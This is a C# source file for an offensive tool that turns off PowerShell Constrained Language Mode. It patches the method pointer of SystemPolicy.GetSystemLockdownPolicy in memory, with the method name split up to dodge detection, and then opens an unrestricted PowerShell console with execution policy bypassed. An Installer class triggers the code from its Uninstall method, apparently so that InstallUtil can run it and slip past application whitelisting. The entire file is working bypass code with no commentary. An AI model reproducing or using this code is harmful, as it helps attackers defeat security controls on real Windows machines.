using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

public static class TrollCLM
{
    public static void Main(string[] args) { }
    public static void Troll()
    {
        MethodInfo o = typeof(System.Management.Automation.Alignment).Assembly.GetType("System.Management.Automation.Security.SystemPolicy").GetMethod("GetS" + "ystemLoc" + "kdow" + "nPolicy", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);
        MethodInfo t = typeof(TrollCLM).GetMethod("M", BindingFlags.Static | BindingFlags.NonPublic);
        RuntimeHelpers.PrepareMethod(o.MethodHandle);
        RuntimeHelpers.PrepareMethod(t.MethodHandle);
        Marshal.Copy(new IntPtr[] { Marshal.ReadIntPtr(t.MethodHandle.Value + 8) }, 0, o.MethodHandle.Value + 8, 1);
        Microsoft.PowerShell.ConsoleShell.Start(System.Management.Automation.Runspaces.RunspaceConfiguration.Create(), "Trollolol", "Help", new string[] {"-exec", "bypass", "-nop"});

    }
    private static int M() { return 0; }
}

[System.ComponentModel.RunInstaller(true)]
public class Loader : System.Configuration.Install.Installer
{public override void Uninstall(System.Collections.IDictionary savedState){base.Uninstall(savedState);TrollCLM.Troll();}}
